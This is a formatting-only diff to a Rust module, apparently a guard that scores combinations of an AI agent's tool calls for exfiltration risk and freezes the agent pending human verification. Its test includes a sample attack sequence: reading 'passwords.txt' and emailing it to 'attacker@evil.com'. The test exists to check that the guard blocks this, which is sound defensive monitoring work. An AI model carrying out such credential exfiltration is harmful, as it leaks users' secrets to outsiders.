@@ -26,16 +26,20 @@ impl CognitiveGuard {
     }
 
     /// Monitors 'Innocent' tool collusion in real-time.
-    pub async fn monitor_tool_synergy(&self, agent_id: &str, tool_actions: &[ToolAction]) -> Result<(), String> {
+    pub async fn monitor_tool_synergy(
+        &self,
+        agent_id: &str,
+        tool_actions: &[ToolAction],
+    ) -> Result<(), String> {
         // 1. Query Neo4j for the 'Synergy Map' of these specific tools
         // Even if Tool A and Tool B are safe, does their COMBINATION lead to exfiltration?
         let synergy_risk = self.calculate_combination_risk(tool_actions);
 
         if synergy_risk > self.intent_threshold {
-            // V39: Toxic Combination identified. 
+            // V39: Toxic Combination identified.
             // We freeze the agent's memory before the action executes.
             self.freeze_agent_state(agent_id).await;
-            
+
             return Err(format!(
                 "Toxic Combination Detected (Score: {}). Mitigation: Manual Human Verification Required (V34 MFA)",
                 synergy_risk
@@ -47,7 +51,7 @@ impl CognitiveGuard {
     fn calculate_combination_risk(&self, actions: &[ToolAction]) -> f64 {
         // Mock Synergy Risk Calculation
         // In a real system, this queries a Neo4j Graph of "Known Attack Paths"
-        
+
         let mut has_search = false;
         let mut has_email = false;
         let mut has_file_read = false;
@@ -78,7 +82,10 @@ impl CognitiveGuard {
 
     async fn freeze_agent_state(&self, agent_id: &str) {
         // Atomic wipe of volatile context and suspension of NHI (Identity)
-        println!("[DBS PROTOCOL] Critical Logic Breach: Agent {} Frozen.", agent_id);
+        println!(
+            "[DBS PROTOCOL] Critical Logic Breach: Agent {} Frozen.",
+            agent_id
+        );
     }
 }
 
@@ -90,8 +97,14 @@ mod tests {
     async fn test_high_risk_synergy_block() {
         let guard = CognitiveGuard::default();
         let actions = vec![
-            ToolAction { tool_name: "read_file".to_string(), params: "passwords.txt".to_string() },
-            ToolAction { tool_name: "email".to_string(), params: "attacker@evil.com".to_string() },
+            ToolAction {
+                tool_name: "read_file".to_string(),
+                params: "passwords.txt".to_string(),
+            },
+            ToolAction {
+                tool_name: "email".to_string(),
+                params: "attacker@evil.com".to_string(),
+            },
         ];
 
         let result = guard.monitor_tool_synergy("agent_007", &actions).await;
@@ -102,9 +115,10 @@ mod tests {
     #[tokio::test]
     async fn test_low_risk_synergy_allow() {
         let guard = CognitiveGuard::default();
-        let actions = vec![
-            ToolAction { tool_name: "search".to_string(), params: "weather".to_string() },
-        ];
+        let actions = vec![ToolAction {
+            tool_name: "search".to_string(),
+            params: "weather".to_string(),
+        }];
 
         let result = guard.monitor_tool_synergy("agent_007", &actions).await;
         assert!(result.is_ok());
